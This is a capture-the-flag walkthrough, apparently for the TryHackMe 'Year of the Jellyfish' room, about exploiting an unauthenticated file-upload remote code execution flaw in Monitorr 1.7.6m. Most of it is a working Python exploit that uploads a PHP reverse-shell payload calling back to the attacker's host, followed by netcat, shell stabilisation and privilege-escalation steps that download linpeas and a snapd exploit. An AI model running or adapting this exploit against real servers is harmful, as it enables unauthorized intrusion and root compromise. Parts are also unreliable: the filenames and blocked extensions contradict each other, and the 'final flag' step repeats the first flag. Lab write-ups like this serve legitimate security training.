# Year of the Jellyfish  
> Remote Code Execution Exploit `Monitorr 1.7.6m`

### Exploit Overview
This exploit demonstrates an unauthenticated Remote Code Execution (RCE) vulnerability in **Monitorr 1.7.6m**, a monitoring software. The vulnerability allows for unauthorized access and execution of arbitrary code on the target system. 

### Vulnerability Details
- **Software**: Monitorr 1.7.6m
- **Version**: 1.7.6m
- **Exploit Author**: Lyhin's Lab
- **Vulnerability**: Remote Code Execution (Unauthenticated)
- **Tested on**: Ubuntu 19
- **Issue**: File upload bypass and code execution via crafted file upload (`.gif.phtml` extension)


### Set Up Your Exploit Environment
Before running the exploit, make sure you have the following parameters ready:
- **Target URL**: The URL of the Monitorr application.
- **LHOST**: Your local IP address where the reverse shell will connect.
- **LPORT**: The port for the reverse shell to connect to (commonly port `443` for HTTPS).

### Create the Exploit
Here’s the Python script that performs the exploit.
```python
#!/usr/bin/python

import requests
import os
import sys

if len (sys.argv) != 4:
        print ("Specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
    url = sys.argv[1] + "/assets/php/upload.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1]}

    data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"hello.php\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
    cookies = {"isHuman" : "1"}
    
    reqData = requests.post(url, headers=headers, data=data, cookies=cookies, verify=False)

    print(reqData.text)

    print ("A shell script should be uploaded. Now we try to execute it")
    url = sys.argv[1] + "/assets/data/usrimg/hello.php"
    print(requests.get(url, headers=headers, cookies=cookies, verify=False).text)
```
### File Upload Bypass and Reverse Shell
The upload functionality in Monitorr blocks certain extensions like .php, .phtml, and .php.gif. The exploit tries these extensions, and the final working extension found was .gif.phtml. This extension bypasses the file upload filter.

### Reverse Shell
Once the shell is uploaded, the script attempts to access the uploaded PHP shell (hello.php), which triggers a reverse shell connection. The exploit uses a random filename for the shell, making detection more difficult.
```python
filename = str(random.randint(1000, 10000))
data = f"-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"{filename}.gif.phtml\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
```

Run the following Netcat listener to catch the incoming shell:
```bash
$ nc -lvnp 443
```

### Accessing the Shell
The shell will be established and can be accessed using the following command:
```bash
$ python exploit-rce.py https://monitorr.robyns-petshop.thm <YOUR_IP> 443
```

```vbnet

File pwn2own.gif.phtml has been uploaded to: ../data/usrimg/pwn2own.gif.phtml
```

### Flag 1
Once the shell has been successfully uploaded and triggered, you can interact with the system. The first flag can be found by navigating to the usrimg directory.
```bash
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ whoami
www-data
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ cd ~
www-data@petshop:/var/www$ ls
dev  flag1.txt	html  monitorr
www-data@petshop:/var/www$ cat flag1.txt 
THM{MjBkO**********************NGNl}
```

### Post Exploitation
After gaining access, you can execute the following commands for further enumeration and privilege escalation:
```bash
www-data@petshop:/var/www/monitorr/assets/data$ which python3
/usr/bin/python3
www-data@petshop:/var/www/monitorr/assets/data$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@petshop:/var/www/monitorr/assets/data$ export TERM=xterm
www-data@petshop:/var/www/monitorr/assets/data$ ^Z
[1]+  Stopped                 nc -lvnp 443
```

### Privilege Escalation
After establishing a stable shell, you can download tools like linpeas.sh to check for privilege escalation opportunities.
```bash
$ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh > linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

Look for upgradable software, such as snapd, which might be vulnerable:
```bash
$ apt list --upgradable
```

In this case, snapd was found to be upgradable and exploitable via a local privilege escalation exploit.

```bash
$ searchsploit snapd
```

Finally, download and run the exploit to escalate privileges:
```bash
$ wget https://www.exploit-db.com/download/46362
$ python 46362.py
```

### Final Flag and Root Access
Once you successfully execute the privilege escalation, you can read the final flag and obtain root access.

```bash
www-data@petshop:/var/www$ cat flag1.txt
THM{MjB************************jNGNl}
```

> This is a demonstration of how to exploit an unauthenticated RCE vulnerability and escalate privileges on a vulnerable system. Always ensure you have explicit permission to test and exploit any system in a legal environment, such as Capture the Flag (CTF) challenges or authorized pen-testing engagements.

#### References
- https://github.com/Monitorr/Monitorr
- https://www.exploit-db.com/exploits/46362


